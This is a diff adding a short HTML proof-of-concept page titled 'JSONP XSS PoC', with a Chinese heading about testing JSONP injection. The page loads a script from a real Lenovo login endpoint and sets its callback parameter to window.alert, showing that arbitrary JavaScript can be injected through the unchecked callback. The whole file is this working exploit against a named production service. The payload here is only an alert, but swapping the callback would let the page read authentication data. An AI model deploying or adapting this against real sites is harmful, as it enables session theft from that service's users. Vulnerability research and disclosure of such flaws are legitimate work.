@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JSONP XSS PoC</title>
+</head>
+<body>
+    <h1>测试 JSONP 注入</h1>
+    <script src="https://reg.lenovo.com.cn/auth/v3/synlogin?tk=test&callback=window.alert"></script>
+</body>
+</html>
